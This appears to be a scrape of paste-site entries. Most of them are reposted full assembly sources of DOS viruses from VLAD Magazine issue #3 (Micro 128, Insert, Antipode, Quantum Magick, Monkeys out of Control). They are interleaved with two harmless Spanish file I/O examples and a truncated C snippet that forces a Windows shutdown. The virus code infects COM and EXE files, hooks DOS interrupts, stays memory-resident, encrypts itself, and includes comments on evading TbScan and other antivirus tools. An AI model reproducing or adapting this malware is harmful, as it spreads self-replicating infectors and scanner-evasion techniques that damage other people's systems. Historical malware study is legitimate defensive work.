xGSLxJUM,VLAD Magazine - Issue #3 - ARTICLE.3_6 - Disassembly of Micro 128,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:26:53 PM CDT,";                             Darkman/VLAD
;                           Proudly Presents
;                       Disassembly of Micro 128


micro128     segment
             assume  cs:micro128,ds:micro128,es:micro128
             org     100h                ; Origin of COM-file

code:
jumpcode     db      0e9h,03h,00h        ; Jump to viruscode
viruscode:
realcode     db      0cdh,20h,90h        ; Real code of infected file

             lea     di,code             ; DI = offset of code
             push    di                  ; Save DI at stack
             mov     si,di
             add     si,[di+01h]         ; SI = delta offset (viruscode)
             movsw                       ; Move the real code to beginning
             movsb                       ;  ""    ""   ""    ""   ""   ""     ""
             xor     ax,ax               ; Clear AX
             mov     es,ax               ; ES = interrupt table
             mov     di,303h             ; DI = offset of hole in memory
             mov     cl,7dh              ; Move 125 bytes
             rep     movsb               ; Move virus to hole in memory
             scasw                       ; Overwritten anything?
             jne     virusexit           ; Not equal? Jump to virusexit
             std                         ; Set direction flag
setintvec:
             xchg    ax,es:[di+0fd04h]   ; Exchange AX with int 21h
             stosw                       ; Store address of interrupt 21h
             mov     ax,033fh            ; AX = offset of virusint21
             cmc                         ; Complement carry flag
             jb      setintvec           ; Carry flag? Jump to setintvec
             cld                         ; Clear direction flag
virusexit:
             push    cs                  ; Save CS at stack
             pop     es                  ; Load ES from stack (CS)
             ret                         ; Return!
mvfptrbegin:
             mov     al,00h              ; Move file pointer from beginning
movefileptr:
             mov     ah,42h              ; Move file pointer
             xor     cx,cx               ; Clear CX
             xor     dx,dx               ; Clear DX
             int     0e0h                ; Do it!

             mov     cl,03h
             mov     dh,03h
             ret                         ; Return!

micro128cod  db      0e9h,?,?            ; New code of infected file
virusint21:
             cmp     ah,4bh              ; Load or execute?
             jne     int21exit           ; Not equal? Jump to int21exit

             push    ax                  ; Save AX at stack
             push    bx                  ; Save BX at stack
             push    dx                  ; Save DX at stack
             push    ds                  ; Save DS at stack

             mov     ax,3d02h            ; Open file (read/write)
             int     0e0h                ; Do it!
             jb      closefile           ; Below? Jump to closefile
             mov     bx,ax               ; BX = file handle

             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)
             call    mvfptrbegin

             mov     ah,3fh              ; Read from file
             int     0e0h                ; Do it!
             cmp     byte ptr ds:[300h],'M'
             je      closefile           ; Equal? Jump to closefile

             dec     ax                  ; Decrease AX
             call    movefileptr
             mov     ds:[33dh],ax        ; Store offset of virus code

             mov     ah,40h              ; Write to file
             mov     cl,(codeend-viruscode)
             int     0e0h                ; Do it!

             call    mvfptrbegin

             mov     dl,3ch              ; DX = offset of micro128cod
             mov     ah,40h              ; Write to file
             int     0e0h                ; Do it!
closefile:
             mov     ah,3eh              ; Close file
             int     0e0h                ; Do it!

             pop     ds                  ; Load DS from stack
             pop     dx                  ; Load DS from stack
             pop     bx                  ; Load DS from stack
             pop     ax                  ; Load DS from stack
int21exit:
jumpfar      db      0eah                ; Object code of jump far
codeend:

micro128     ends
end          code"
dmA3eRDi,Ejemplo Python,cardel,Python,Thursday 29th of June 2023 09:26:35 PM CDT,"
#Escribir archivo
f=open(""salida.bin"",""wb"")
data=[1,1,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,1,0,0,1,0,0,1,0,0,0,1,00,0,0,1,0,1,0,1,1,1,1,0,0,1,1,1,0,1,1,1,1,0,0,1]
print(data)
arr=bytearray(data)
f.write(arr)
f.close()

#Leer archivo
fin = open(""salida.bin"",""rb"")
dataIn = fin.read()
dataDec = [data[x] for x in range(0,len(dataIn))]
print(dataDec)
fin.close()"
Uu3yGunP,VLAD Magazine - Issue #3 - ARTICLE.4_4 - Insert,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:25:04 PM CDT,";                             Darkman/VLAD
;                           Proudly Presents
;                             I N S E R T
;            - No flags with TbScan v 6.30 high heuristic -

psp          equ     100h

insert       segment
             assume  cs:insert,ds:insert,es:insert
             org     00h                 ; Origin of COM-file

code:
             lea     di,psp+crypt         ; DI = offset of crypt
             call    xorcrypt
crypt:
             mov     ax,6302h            ; Insert service
             int     21h                 ; Do it!
             cmp     ax,bx               ; Already resident?
             je      virusexit           ; Equal? Jump to virusexit

             push    ds                  ; Save DS at stack
             mov     ax,ds
             dec     ax                  ; Decrease AX
             mov     ds,ax               ; DS = segment of programs MCB

             cmp     byte ptr ds:[00h],'Z'
             jne     insexit             ; Not last in chain? Jump to insexit
             sub     word ptr ds:[03h],(02h*(codeend-code)+0fh)/10h
             sub     word ptr ds:[12h],(02h*(codeend-code)+0fh)/10h
             add     ax,ds:[03h]         ; AX = MCB + size of memory block
             inc     ax                  ; AX = first usable MCB segment
             pop     ds                  ; Load DS from stack

             cld                         ; Clear direction flag
             push    es                  ; Save ES at stack
             mov     es,ax               ; ES = first usable program segment
             mov     cx,(codeend-code)   ; Move 271 bytes
             xor     di,di               ; Clear DI
             lea     si,psp+code         ; SI = offset of code
             rep     movsb               ; Move virus to high memory

             xor     ax,ax               ; Clear AX
             mov     ds,ax               ; DS = segment of interrupt table
             lea     di,int21adr         ; DI = offset of int21adr
             mov     si,(21h*04h)        ; SI = offset of interrupt 21h
             movsw                       ; Store address of interrupt 21h \
             movsw                       ; in int21adr                    /
             mov     word ptr ds:[21h*04h],offset virusint21
             mov     ds:[21h*04h+02h],es ; Intercept interrupt 21h
             pop     es                  ; Load ES from stack
             push    es                  ; Save ES at stack
insexit:
             pop     ds                  ; Load DS from stack (ES)
virusexit:
             mov     ax,65535-(restoreend-restore)
             mov     cx,(restoreend-restore)
             mov     di,ax               ; DI = offset of end of memory
             lea     si,psp+restore      ; SI = offset of restore
             rep     movsb               ; Move restore code to end of memory
             jmp     ax                  ; Jump to restore

virusint21   proc    near                ; Interrupt 21h of Insert
             pushf                       ; Save flags at stack

             cmp     ah,3ch              ; Create a file?
             je      infectfile          ; Equal? Jump to infectfile
             cmp     ah,5bh              ; Create new file?
             je      infectfile          ; Equal? Jump to infectfile
             cmp     ax,6302h            ; Insert service?
             je      insservice          ; Equal? Jump to insservice

             popf                        ; Load flags from stack
jumpfar      db      0eah                ; Object code of jump far
int21adr     dd      ?                   ; Address of interrupt 21h
insservice:
             mov     bx,ax
             popf                        ; Load flags from stack
             iret                        ; Interrupt return!
infectfile:
             call    dword ptr cs:int21adr
             pushf                       ; Save flags at stack
             jc      createerror         ; Error? Jump to createerror

             push    ax                  ; Save AX at stack
             push    bx                  ; Save BX at stack
             push    di                  ; Save DI at stack
             push    es                  ; Save ES at stack

             xchg    ax,bx               ; Exchange AX with BX

             mov     ax,1220h            ; Get system file table number
             int     2fh                 ; Do it! (multiplex)

             push    bx                  ; Save BX at stack
             mov     ax,1216h            ; Get address of system FCB
             mov     bl,es:[di]          ; BL = system file table entry
             int     2fh                 ; Do it! (multiplex)
             pop     bx                  ; Load BX from stack

             cmp     word ptr es:[di+28h],'OC'
             jne     exterror            ; Not equal? Jump to exterror
             cmp     byte ptr es:[di+2ah],'M'
             jne     exterror            ; Not equal? Jump to exterror

             push    cx                  ; Save CX at stack
             push    dx                  ; Save DX at stack
             push    si                  ; Save SI at stack
             push    ds                  ; Save DS at stack

             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack
             push    cs                  ; Save CS at stack
             pop     es                  ; Load ES from stack

             in      ax,40h              ; AX = port 40h
             mov     cryptvalues,ax      ; Store the crypt value

             mov     cx,(codeend-code)   ; Move 271 bytes
             lea     di,codeend          ; DI = offset of codeend
             lea     si,code             ; SI = offset of code
             rep     movsb               ; Move virus to high memory

             lea     di,codeend+06h      ; DI = offset of crypt
             call    xorcrypt

             mov     ah,40h              ; Write to file
             mov     cx,(codeend-code)   ; Write 271 bytes
             lea     dx,codeend          ; DX = offset of codeend
             int     21h                 ; Do it!

             pop     ds                  ; Load DS from stack
             pop     si                  ; Load SI from stack
             pop     dx                  ; Load DX from stack
             pop     cx                  ; Load CX from stack
exterror:
             pop     es                  ; Load ES from stack
             pop     di                  ; Load DI from stack
             pop     bx                  ; Load BX from stack
             pop     ax                  ; Load AX from stack
createerror:
             popf                        ; Load flags from stack

             retf    02h                 ; Return far and pop a word!
             endp

restore      proc    near                ; Restore code of original program
             lea     ax,psp+code         ; AX = beginning of code
             mov     di,ax
             lea     si,psp+codeend      ; SI = offset of real code
             mov     cx,(65535-psp-(restoreend-restore))-(codeend-code)
             rep     movsb               ; Move the real code to the beginning
             jmp     ax                  ; Jump to the real code
             endp
restoreend:
virusname    db      ' [Insert]'         ; Name of the virus
virusauthor  db      ' [Darkman/VLAD] '  ; Author of the virus
cryptend:
xorcrypt     proc    near                ; XOR Encrypt/Decrypt
             mov     cx,(cryptend-crypt)/02h
cryptcode:
xorwordptr   db      81h,35h             ; xor word ptr [di],0000h \
cryptvalues  dw      ?                   ;  ""   ""    ""      ""      /
             inc     di                  ; Increase DI
             inc     di                  ; Increase DI
             loop    cryptcode
             ret                         ; Return!
             endp
codeend:
             int     20h                 ; Exit to DOS!

insert       ends
end          code"
T2QV1kRq,VLAD Magazine - Issue #3 - ARTICLE.4_3 - Antipode,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:24:06 PM CDT,"; Hi guys...
; Tonight it's Sun 1 Jan 1995     0:03:16 (4DOS Time)
; The Radio is playing U2's NEW YEARS DAY ;)
; So, I wish you a Happy NEW YEAR !!!!

; This virus is called Antipode, because of the position of France in
;       relation to Australia.
; It's my very first release:
;       - .COM/.com infection, not COMMAND.COM
;       - Find-first/next stealth     4e/4f + 11/12
;       - Time based marker: seconds field=2
;       - Infects read-only files
;       - Restores original Time/Date + second=2
;       - XOR encryption
;       - Memory resident, using MCB's
;       - Infection on Exec+Open+Extended Open
;               it's a pretty fast infector... try to scan your disk when
;               resident, it will use SCAN/TBSCAN and even F-PROT 
;               as a vector :)
;       - Write Protect Errors removed by int 24h handler
;       - I added a little trick to fool Veldman's TBSCAN, when in memory,
;               TBSCAN don't scan any infected file...

;       I'm sorry, but due to the encryption this virus is a bit tricky to 
;       create:         you must assemble as usual,
;                       link it to a bin file : IP must be 0
;                       append it to a .com that just jumps at the end
;                       now trace the resulting .com and skip the encryption
;                       but you MUST execute the push dx,
;                       without getting trapped by Qark :)

;       That's not too hard, but you must be worthy to use this virus :)



exec_adr        =       0000:0100h              ; Address of return

		jumps                           ; Allow Tasm to resolve too
						; long jumps
virusseg        segment byte public
		assume  cs:virusseg, ds:virusseg

		org     0000h                   ; Begin the virus at IP=0

start:
		push    ds:[101h]               ; 101=offset of the jump
		pop     dx
		add     dx,103h                 ; Dx=offset start
		push    dx                      ; put it on the stack

		mov     si,offset quit          ; adaptation of Qarks routine
						; to fool debuggers
		add     si,dx
		mov     word ptr ds:[si],20CDh
quit:           mov     word ptr ds:[si],04C7h
						; Heuristics and debuggers
						; won't find us now.
		call    cryptage                ; decrypt the virus
		jmp debut_cr                    ; jump to the virus

cryptage        proc near
		mov     si,offset debut_cr      ; start of the encrypted area
		add     si,dx                   ; fix it 
		mov     di,si                   ; use si as the xor value
cryptage_2      proc near                       ; this proc will be called to
						; encrypt the virus
		mov     cx,offset last-offset debut_cr
						; cx=length to encrypt
cr:             xor     word ptr ds:[si],di     ; enc/decrypt the virus
		inc     si                      ; move to next byte 
		loop    cr                      ; and enc/decrypt the virus
		ret
cryptage_2      endp
cryptage        endp

debut_cr:       
		mov     si,offset buffer        ; Buffer contains original
						; bytes of the virus
		add     si,dx                   ; fix it once again
		mov     di,100h                 ; destination is entrypoint
		push    cs
		pop     es
		movsw
		movsb                           ; Patch back to the original

		mov     ah,02ch                 ; Ask for the Time
		int     21h
		cmp     dl,242                  ; Are we in memory ? 
		jne     not_in_ram              ; if not, install
		push    cs
		mov     ax,100h
		push    ax
		retf                            ; go back to original entry

not_in_ram:
		push    cs
		pop     ax
		dec     ax
		mov     ds,ax                   ; DS -> MCB
		inc     ax
		mov     cx,word ptr ds:[0003]
		mov     dx,cx                   ; DX=number of parag. left
		add     dx,ax
		sub     cx,(((last2-start)/16)+1)*2
						; alloc 2*size of the virus 
		mov     word ptr ds:[0003],cx   ; fix the MCB
		mov     cx,dx
		sub     cx,(((last2-start)/16)+1)*2
		mov     es,cx                   ; es=future cs of the virus
		mov     cx,(last2-start)+1      ; size of the virus
		push    cs
		pop     ds
		pop     dx
		mov     si,dx                   ; si = entry of the virus

		push    si
		push    cx

		mov     di,0
		rep movsb                       ; copy the virus to es:0

		pop     cx
		pop     si

		rep movsb                       ; once again

		push    es
		mov     cx,offset nextstep
		push    cx
		retf                            ; Jump to ES:IP
		;install the virus in ram and hook vectors
nextstep:                                       ; We are at the top of mem

		push    cs
		pop     ds
		mov     word ptr ds:[farjmp+3],ax
						; Fix the return adress

		mov     ax,3521h                ; Save the int 21h vectors
		int     21h
		mov     ds:word ptr save_int21+2,es     
		mov     ds:word ptr save_int21,bx

		mov     dx,offset my_int21      ; Use our int instead
		mov     ax,2521h
		int     21h

farjmp:         jmp far ptr exec_adr            ;Return to the original


my_int21        proc    far
		cmp     ah,11h          ; Find first
		je      dir_stealth
		cmp     ah,12h          ; Find next
		je      dir_stealth
		cmp     ah,4Eh          ; Find first
		je      find_file
		cmp     ah,4Fh          ; Find next
		je      find_file
		cmp     ah,3dh          ; File open
		je      check_it
		cmp     ah,4bh          ; Exec
		je      check_it
		cmp     ah,6ch          ; Extended open
		je      check_it
		cmp     ah,4ch
		je      terminate
		cmp     ah,02ch         ; Time
		jne     to_vect

		call    int21

		mov     dl,242          ; seconds = 242
		push    cs
		pop     bx
		iret
check_it:
		jmp     check_it2

dir_stealth:
		call    int21
		test    al,al
		jnz     not_a_file

		pushf
		push    ax
		push    bx
		push    es

		mov     ah,51h
		int     21h

		mov     es,bx
		cmp     bx,es:[16h]
		jnz     not_infected
		mov     bx,dx
		mov     al,[bx]
		push    ax
		mov     ah,2fh
		int     21h
		pop     ax
		inc     al
		jnz     fcb_ok
		add     bx,7h
fcb_ok:         mov     ax,es:[bx+17h]
		add     bx,3
		jmp     patch_size
find_file:
		call    int21
		jc      not_a_file
		pushf
		push    ax
		push    bx
		push    es

		mov     ah,2Fh
		int     21h                     ; Ask for the DTA

		mov     ax,es:[bx+16h]          ; ax=time 
patch_size:
		and     al,1fh                  ; ax=seconds
		xor     al,1                    ; are seconds=2 ?
		jnz     not_infected
		mov     ax,offset last-offset start
						; ax = size of the virus
		cmp     byte ptr cs:[tbscan_active],1
						; is TBSCAN active ?
		jne     dont_fool
		mov     ax,word ptr es:[bx+1Ah] ; if active the file size = 0

dont_fool:      sub     word ptr es:[bx+1Ah],ax
						; sub virus size to file size

not_infected:
		pop      es
		pop      bx
		pop      ax
		popf

not_a_file:
		retf 2                          ; no iret to save the flags
						; thanks to Qark...

check_it2:      pushf
		push    ax
		push    bx
		push    cx
		push    di
		push    dx
		push    ds
		push    es
		push    si                      ; TOO MANY PUSHS !!!
						; OPTIMISE !!!
		mov     byte ptr cs:[function],ah
						; save ah for later
		cmp     ax,6c00h
		jne     not_extended
		cmp     dx,0001                 ; int 21h ax=6c00h/dx=0001h->
						; int 21 ah=3dh
		jne     no_good
		mov     dx,si                   ; the name -> DS:SI
not_extended:
		push    ds
		push    dx                      ; save filename seg/offs

		mov     ax,3524h
		int     21h
		mov     word ptr cs:[save_int24],bx
		mov     word ptr cs:[save_int24+2],es
						; save int 24h
		push    cs
		pop     ds
		mov     dx,offset my_int24
		mov     ax,2524h
		int     21h                     ; install our int

		pop     dx
		pop     ds                      ; restore the filename

		mov     al,00h
		push    ds
		push    ds
		pop     es
		mov     di,dx
		mov     cx,0ffh
		repne   scasb                   ; seek to the end of the name

		push    cs
		pop     ds
		cmp     byte ptr cs:[function],4bh
		jne     not_exec
		push    di
		sub     di,11
		mov     si,offset tbscan
		mov     cx,10
		rep     cmpsb
		jnz     not_tbscan
		mov     byte ptr cs:[tbscan_active],1
not_tbscan:
		pop     di
not_exec:
		sub     di,4
		push    di                      ; seek to the extension

		mov     si,offset comfile
		mov     cx,3

		rep     cmpsb                   ; check if the file is a COM
		pop     di
		jz      good


		push    di
		mov     si,offset comfile+3
		mov     cx,3

		rep     cmpsb                   ; or a com
		pop     di
		jnz     no_good

good:
		pop     ds
		cmp     byte ptr [di-2],'D'     ; COMMAND.COM ?
		jnz     not_command             
		cmp     byte ptr [di-8],'C'
		jz      push_no_good

not_command:    mov     ax,4300h
		int     21h                     ; get the attributes

		mov     word ptr cs:[save_attrib],cx
		jc      exit_2                  ; if no file exists...RUN !!!

		mov     ax,4301h
		xor     cx,cx
		int     21h                     ; set zero attributes

		push    ds
		push    dx

		mov     ax,3d02h                ;Open file Read/write

		call    int21

		mov     bx,ax                   ; bx = handle
		mov     ax,5700h                ; get file time/date
		int     21h
		mov     cs:[save_time],cx
		mov     cs:[save_date],dx       ; save them

		mov     ax,word ptr cs:[save_time]
						;Check for an infection
		and     al,1Fh
		xor     al,1    
		je      dirty_exit

		push    cs
		pop     ds
		mov     dx,offset buffer+(offset last2-offset start)+1
		mov     cx,end_patch-patch
		mov     ax,3F00h                ; Read xx first bytes
		int     21h                     ; to te buffer of the second
						; copy of the virus in memory

		xor     cx,cx
		xor     dx,dx
		mov     ax,4202h                ; Seek to EOF..
		int     21h

		mov     di,ax                   ; ax = end of file
		add     di,offset debut_cr-offset start+100h
						; di = value of the XOR
		sub     ax,3h                   ; ax = adress of the jump
		mov     word ptr cs:[return+1],ax
						; patch the future file
		mov     si,(offset last2-offset start)+offset debut_cr+1
						; si=offset of the 2nd virus
		push    si
		push    di

		call    cryptage_2              ; crypt the 2nd copy

		push    cs
		pop     ds
		mov     dx,offset last2+1       ; dx= offset of the 2nd copy
		mov     cx,last-start
		mov     ah,40h
		int     21h                     ; Write the virus to file...

		pop     di
		pop     si

		call    cryptage_2              ; decrypt the 2nd copy

		xor     cx,cx
		xor     dx,dx
		mov     ax,4200h                ; seek to start of file
		int     21h

		push    cs
		pop     ds
		mov     dx,offset patch
		mov     cx,end_patch-patch
		mov     ah,40h
		int     21h                     ; write the jump to the file

		mov     dx,cs:[save_date]
		mov     cx,cs:[save_time]
		or      cx,0001h
		and     cx,0FFE1h
		mov     ax,5701h
		int     21h                     ; restore file time/date

dirty_exit:
		pop     dx
		pop     ds

		mov     ah,3eh
		int     21h                     ; close the file


exit_2:         mov     ax,4301h
		mov     cx,word ptr cs:[save_attrib]
		int     21h                     ; restore the attributes
push_no_good:
		push    ds
no_good:
		pop     ds
		mov     ds,cs:[save_int24+2]
		mov     dx,cs:[save_int24]
		mov     ax,2524h
		int     21h                     ; restore the int 24h
		pop     si
		pop     es
		pop     ds
		pop     dx
		pop     di
		pop     cx
		pop     bx
		pop     ax
		popf
to_vect:        jmp     dword ptr cs:[save_int21]
						; and call the int 21h
terminate:
		mov     byte ptr cs:[tbscan_active],0
		jmp     to_vect

my_int21        endp

my_int24        proc    far                     ; int 24h
		mov     al,0                    ; no problem...
		iret                            ; and return
my_int24        endp

comfile         db 'COMcom'                     ; extensions to infect
tbscan          db 'TBSCAN.EXE'
		db '[Antipode 1.0]',0
		db 'by Automag/VLAD'
tbscan_active   db      0
buffer:         db      0CDh,20h,90h    
int21   proc    near
		pushf
		db 9Ah
save_int21      dw      2 dup (?)
		ret
int21   endp

patch:
return:         db      0e9h
last:           db      00,00
end_patch:


save_int24      dw      2 dup (?)
function        db      0
save_attrib     dw      0
save_date       dw      0
save_time       dw      0

last2:
virusseg        ends
		end     start"
BnjxEbBe,VLAD Magazine - Issue #3 - ARTICLE.4_6 - Quantum Magick,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:21:50 PM CDT,"; Quantum Magick, a laboratory specimen by Rhincewind [Vlad]
;
; This is a bit of my older work. Quantum Magick demonstrates the use of
; SFT's to infect programs on file read, which happens to circumvent
; tbfile if it was the command interpreter that originally opened the file.
;
; Some of the code in here has high embarrassment potential, such as the 
; kludgey fragment used to avoid the Darth Vader scanstring and heuristics,
; not to mention the use of the jumps directive. Ouch.
;
; The more-than-necessary use of memory pushes and pops and exchanges 
; involving the memory banks are just because I felt like it. 
;
; And that's that.

                .model tiny
                .code
                jumps
                org 0h

start:
                push ds
                push es
installation_check:
                mov ah, 30h
                int 21h
                cmp bh,30h
                jz no_install
                cmp al,3
                jb no_install
allocate_memory:
                push es
                pop ax
                dec ax
                push ax
                pop ds
                xor si,si
                lodsb
                xor al, 'Z'
                jnz abort_install
                add word ptr ds:[si+2], -parasize
                add word ptr ds:[si+11h], -parasize
copy_code:
                mov es, word ptr ds:[si+11h]
                push cs
                call next
next:
                pop si
                pop ds
                sub si, offset (next-start)
                mov cx, (endvirus-start)
                xor di,di
                rep movsb
hook_int:                
                push cx
                pop ds
                cli
                mov ax, offset handler
                xchg ax, word ptr ds:[84h]
                stosw
                mov ax,es
                xchg ax, word ptr ds:[86h]
                stosw
                sti
abort_install:
no_install:
                pop es
                pop ds
                mov bx,ds
                add bx,10h
                call next2
next2:
                pop si
                add bx, word ptr cs:[si+(_cs-next2)]
                push bx
                push word ptr cs:[si+(_ip-next2)]
                xor ax,ax
                xor bx,bx
                xor cx,cx
                xor dx,dx
                xor si,si
                xor di,di
                retf
handler:
                cmp ah, 3fh
                jz viruzz
                cmp ah, 30h
                jnz no_chk
                push ax
                call call_int21
                pop bx
                retf 2

plate           db 'Quantum Magick'

no_chk:
                jmp dword ptr cs:int21offset
viruzz:
                cmp bl,5
                jb no_chk
                call call_int21
                pushf
                cmp ax, 18h
                jb not_enough_bytes_read
                push si
                push ax
                push cx
                push dx
                push di
                push ds
                push bx
                push ax
get_sft_address:
                mov si, 1220h
                xchg si,ax
                int 2fh
                mov si, 1216h
                mov bl, byte ptr es:[di]
                xchg si,ax
                int 2fh
                xor si,si
                pop ax
                mov bx,dx
                xchg ax,cx
                call getlen
                sub ax, cx
                jnz no_start_read
                sbb dx, ax
                jnz no_start_read
start_read:
                mov ax, 'ZM'
                xor ax, word ptr ds:[bx]
                jnz exit_read
                cmp word ptr ds:[bx+18h], 40h
                jz exit_read
                cmp word ptr ds:[bx+1ah],si
                jnz exit_read
                cmp word ptr ds:[bx+0ch],si
                jz exit_read
                call getlen
                mov cx, 10h                     ;Filesize div 16.
                div cx
                sub ax, word ptr ds:[bx+8]
                xchg word ptr ds:[bx+14h], dx    ;=CS:IP pair..
                xchg word ptr ds:[bx+16h], ax
                mov cs:_cs,ax
                mov cs:_ip,dx
                mov cl,5
                shr ax,cl
                neg ax
                add ax, word ptr ds:[bx+4]
                cmp al,5
                jb exit_read
                call getlen
                add ax, (endvirus-start)
                adc dx, si
                mov cx, 200h
                div cx
                or dx,dx
                jz no_hiccup
                inc ax
no_hiccup:
                mov word ptr ds:[bx+4],ax
                mov word ptr ds:[bx+2],dx
endcalc:
                mov dx,bx
                pop bx
                push word ptr es:[di+2]
                push word ptr es:[di+15h]
                push word ptr es:[di+17h]
                mov byte ptr es:[di+2],2
                mov word ptr es:[di+15h], 2
                mov word ptr es:[di+17h], si
                mov ah, 40h
                mov cx, 18h
                inc dx
                inc dx
                int 21h
                call getlen
                mov word ptr es:[di+15h], ax
                mov word ptr es:[di+17h], dx
                mov ah, 40h
                push cs
                pop ds
                mov cx, (endvirus-start)
                xor dx,dx
                int 21h
                pop word ptr es:[di+17h]
                pop word ptr es:[di+15h]
                pop word ptr es:[di+2]
                jmp after_file_access
no_start_read:
exit_read:
                pop bx
after_file_access:
                pop ds
                pop di
                pop dx
                pop cx
                pop ax
                pop si
not_enough_bytes_read:                
                popf
                retf 2
getlen:
                mov ax, word ptr es:[di+11h]
                mov dx, word ptr es:[di+13h]
                ret
_cs             dw 0fff0h
_ip             dw 0
call_int21:
                pushf
                call dword ptr cs:int21offset
                ret
endvirus:
int21offset     dw ?
int21seg        dw ?
parasize        equ ((endvirus-start)/16)+2
                
                end start"
EhSBupYN,VLAD Magazine - Issue #3 - ARTICLE.5_1 - Monkeys out of Control Virus  Source Code,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:18:23 PM CDT,"; Monkeys out of Control, a laboratory specimen by Rhincewind [Vlad]
;
; The purpose of this virus is to show that Thunderbyte's tbfile will
; allow writes to file handles that are normally characterbased 
; 'system' handles, set to CON:. Instead of checking if the handle points 
; to a character device, tbfile makes it's judgement based on the handle
; number only. Tsss..
;
; To exploit this flaw, all you have to do is open your target file 
; for read/write and copy the returned file handle to one of the system 
; handles using function 46h.
                
                .model tiny

                .code

                org 100h

start:
                dec bp
                mov si, offset endvirus-2
                mov cx, (endvirus-start)/2
                std
pushloop:                
                lodsw 
                push ax
                loop pushloop           
                push sp
                pop ax
                add ax,(stack_entry-start)
                push ax
                cli
                ret
stack_entry:
                dec sp
                dec sp
                pop bp
                sti
no_int1:
                cld
                mov word ptr [bp+(jmpseg-stack_entry)],cs
                mov si,offset restore-100h    
                org $-2
restore_offset  dw ?
                mov di, 100h
                add si,di
                mov cx, (endvirus-start)
                rep movsb
                push cx
                lea si, [bp-(stack_entry-start)]
                mov di, 200h
                mov es, word ptr [si-2]
                mov cx, (endvirus-start)
                rep movsb
                mov ds,cx
                mov ax, offset seg0_entry+100h
                push ax
                mov ax,0eaf9h
                push ax
                jmp sp
                db 'Monkeys out of Control'
seg0_entry:
                jc dont_hang    
                jmp $
dont_hang:
                mov di, 84h
                les bx, dword ptr es:[di]
                cmp byte ptr ds:[di+2],20h
                jz exit
                mov word ptr ds:[di+(int21offset+100h-84h)],bx
                mov word ptr ds:[di+(int21seg+100h-84h)],es
                mov word ptr ds:[di+2],20h
                mov word ptr ds:[di], offset int21-100h
exit:
                mov ax, [jmpseg+100h]
                mov ds,ax
                mov es,ax
                mov sp,0fffch
                xor ax,ax
                xor bx,bx
                cwd
                xor bp,bp
                xor si,si
                xor di,di
                db 0eah
jmpoffset       dw 100h
jmpseg          dw 0
int21:
                cmp ax, 4b00h
                jnz jmporg21
                push ax
                push bx
                push cx
                push dx
                push ds
                push es
                mov ah, 48h
                mov bx, (((endvirus-start)+15)/16)
                int 21h
                jc abort_before_mem
                push ax
                push ax
                mov ax,3d02h
                int 21h
                xchg ax,dx
                pop ds
                jc free_mem_abort
                mov ah, 45h
                xor bx,bx
                int 21h
                push ax
                mov ah, 46h
                mov bx,dx
                xor cx,cx
                int 21h
                push ax
                mov ah, 3eh
                int 21h
                pop bx
                mov ah, 3fh
                call cx_len_dx_zero
                cmp byte ptr ds:[bx],'M'
                jz file_abort
                mov ax, 4202h
                mov cx,bx
                int 21h
                mov cs:restore_offset-100h,ax
                mov ax, 5700h
                push ax
                int 21h
                push cx
                push dx
                call write
                mov ax, 4200h
                mov cx,bx
                int 21h
                push cs
                pop ds
                call write
                pop dx
                pop cx
                pop ax
                inc ax
                int 21h
file_abort:
                mov ah, 46h
                pop bx
                xor cx,cx
                int 21h
                mov ah,3eh
                int 21h
free_mem_abort:
                pop es
                mov ah, 49h
                int 21h
abort_before_mem:                
                pop es
                pop ds
                pop dx
                pop cx
                pop bx
                pop ax
jmporg21:                
                jmp dword ptr cs:int21offset-100h
write:
                mov ah,40h
cx_len_dx_zero:                
                cwd
                mov cx, (endvirus-start)
int21_ret:                
                int 21h
                ret
align word
endvirus:
restore:
int21offset     dw 20cdh
int21seg        dw ?

                end start"
AP2eZtUt,Ejemplo proyecto Java,cardel,Java,Thursday 29th of June 2023 09:10:08 PM CDT,"import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;

class Main {
	//Guardar
  public static void main(String[] args) {
    byte data[] = {1,1,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,1,0,0,1,0,0,1,0,0,0,1,00,0,0,1,0,1,0,1,1,1,1,0,0,1,1,1,0,1,1,1,1,0,0,1};
		System.out.println(Arrays.toString(data));
		

		try {	
			FileOutputStream fos = new FileOutputStream(""salida.bin"");
			fos.write(data);
			fos.close();
		}
		catch(IOException e) {
			e.getStackTrace();
		}

		//Leer
		try{
			File fin = new File(""salida.bin"");
			FileInputStream finstream = new FileInputStream(fin);
			byte[] dataIn = new byte[(int) fin.length()];
			finstream.read(dataIn);
			finstream.close();
			System.out.println(Arrays.toString(dataIn));

		}
		catch(IOException e) {
			e.getStackTrace();
		}
  }
}"
nBpmsdqQ,some stupid thing,Kitomas,C,Thursday 29th of June 2023 08:35:04 PM CDT,"#define KIT_AUDIO_USE_WINMM
#include <kit_w32.h>
#include <ranggyuM.h> //contains pcm data

int shutdownComputer(){
   HANDLE hToken; TOKEN_PRIVILEGES tkp;
   if(!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken)
   ) return 0;
   LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
   tkp.PrivilegeCount=1;
   tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
   AdjustTokenPrivileges(hToken,0,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
   if(GetLastError() != ERROR_SUCCESS) return 0;
   // Shut down the system and force all applications to close.
   if(!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE,
                     SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
                     SHTDN_REASON_MINOR_UPGRADE |
                     SHTDN_REASON_FLAG_PLANNED)
   ) return 0;
   return 1;
}

extern int printf(const char* __format, ...);

int position=0;
void callback(void* userdata, void* stream, unsigned int len){
  uint8_t* stream_u8=stream;
  if(position >= pcmData_len){
    for(int i=0; i<len; ++i) stream_u8[i]=0x80;
    return;
  }
  for(int i=0; i<len; ++i){
    if(position >= pcmData_len) return;
    stream_u8[i]=pcmData[position];
    ++position;
  }
}

DWORD WINAPI msgboxthread(LPVOID param){
